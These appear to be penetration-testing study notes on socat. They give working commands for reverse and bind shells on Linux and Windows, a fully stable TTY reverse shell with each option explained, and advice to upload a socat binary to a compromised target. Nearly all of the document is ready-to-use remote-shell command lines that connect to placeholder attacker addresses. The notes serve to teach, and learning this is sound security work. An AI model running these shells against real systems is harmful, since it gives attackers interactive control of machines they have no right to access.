## Introduction
- The easiest way to think about socat is as a connector between two points.

#### Reverse Shells 
**syntax**
Here's the syntax for a basic reverse shell listener in socat:
```python
socat TCP-L:<port> -
```
- As always with socat, this is taking two points (a listening port, and standard input) and connecting them together.
- The resulting shell is unstable, but this will work on either Linux or Windows and is equivalent to `nc -lvnp <port>`.

**On Windows we would use this command to connect back:**
```python
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
```
The "pipes" option is used to force powershell (or cmd.exe) to use Unix style standard input and output.

**This is the equivalent command for a Linux Target:**
```python
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
```

#### Bind Shells
**On a Linux target start listener use the following command:**
```python
socat TCP-L:<PORT> EXEC:"bash -li"
```
**Connect to bind shell use the following command:
```python
socat TCP:<TARGET-IP>:<TARGET-PORT> -
```

**On a Windows target we would use this command for our listener:**
```python
socat TCP-L:<PORT> EXEC:powershell.exe,pipes
```
`pipes`: The `pipes` argument enables the usage of pipes to establish bidirectional communication between `socat` and `powershell.exe`. It allows `socat` to act as an intermediary, forwarding data between the TCP connection and the standard input/output (stdin/stdout) of the `powershell.exe` process.

Without the `pipes` argument, `socat` would only be able to execute `powershell.exe` and forward data from the TCP connection to the process's standard input, but it wouldn't be able to capture the process's standard output and send it back to the TCP client. Consequently, any output from `powershell.exe` would be lost, making it less useful for interactive tasks.

**Regardless of the target, we use this command on our attacking machine to connect to the waiting listener.**
```python
socat TCP:<TARGET-IP>:<TARGET-PORT> -
```

**a fully stable Linux tty reverse shell**
This will only work when the target is Linux, but is _significantly_ more stable. use the below command on attacking machine
**Syntax** - 
```python
socat TCP-L:<port> FILE:`tty`,raw,echo=0
```
- As usual, we're connecting two points together. In this case those points are a listening port, and a file.
- **Let's break down the first part of the command step by step:**
	1. `socat`: This is the command itself, used for creating bidirectional data streams between two endpoints.
    
	2. `TCP-L:<port>`: This part specifies that socat should listen on a specific `<port>` for incoming TCP connections. It acts as a listener, waiting for someone to connect to this port.
    
	3. `FILE:`: This part tells socat that the endpoint it will be connecting to is a file.
    
	4. `` `tty` ``: The backticks ( ) are used to execute the `tty` command, which stands for "teletype." It is used to get the name of the terminal file connected to the current process. In simple terms, it identifies the terminal you are currently using.
    
	5. `raw,echo=0`: These are options that modify how the terminal is handled. `raw` mode means that data is sent directly from the terminal to the connected endpoint without any processing. `echo=0` means that the terminal should not display (echo) the characters you type back to you. This setting is useful for creating an interactive shell because otherwise, you would see duplicate characters when typing.
In summary, the first part of the command sets up a listener on a specified `<port>`. When someone connects to this port, socat takes the data from the terminal you are using (TTY) and sends it to the connected endpoint.
It also ensures that the terminal behaves appropriately for an interactive shell, allowing you to interact with the remote system smoothly and without character duplication. This is similar to using the `Ctrl + Z, stty raw -echo; fg` trick with a netcat shell but with additional stability and better integration with the terminal.

**What if the target doesn't have socat installed?**
Most machines do not have socat installed by default, however, it's possible to upload a precompiled socat binary, which can then be executed as normal.
**Command** - 
```python
socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```
The first part is easy -- we're linking up with the listener running on our own machine.
The second part of the command creates an interactive bash session with  `EXEC:"bash -li"`. We're also passing the arguments: pty, stderr, sigint, setsid and sane:

- `pty`: This tells socat to allocate a pseudo-terminal (pty) for the executed shell. This is necessary for interactive shells to work correctly.
    
- `stderr`: This specifies that the standard error (stderr) of the executed command should be redirected to the socket. This ensures that any error messages from the shell are also sent back to the attacker.
    
- `sigint`: This option forwards the interrupt signal (SIGINT) to the executed process. It allows the attacker to send an interrupt signal to the remote shell, simulating pressing Ctrl+C, which is useful for terminating commands or processes running on the target.
    
- `setsid`: This option makes the executed command run in a new session, which can be useful for detaching it from the controlling terminal.
    
- `sane`: This option sets the terminal to a "sane" state, which ensures that the terminal settings are appropriate for an interactive shell session.
In summary, the second socat command creates a reverse shell that connects back to the attacker's machine. When the connection is established, it launches an interactive bash shell on the target machine, allowing the attacker to execute commands and interact with the remote system as if they were directly using a terminal on that machine.

#### Below demonstration to the above commands
- As normal, on the left we have a listener running on our local attacking machine.
- on the right we have a simulation of a compromised target, running with a non-interactive shell.
- Using the non-interactive netcat shell, we execute the special socat command, and receive a fully interactive bash shell on the socat listener to the left:
![[shells7.png]]
Note that the socat shell is fully interactive, allowing us to use interactive commands such as SSH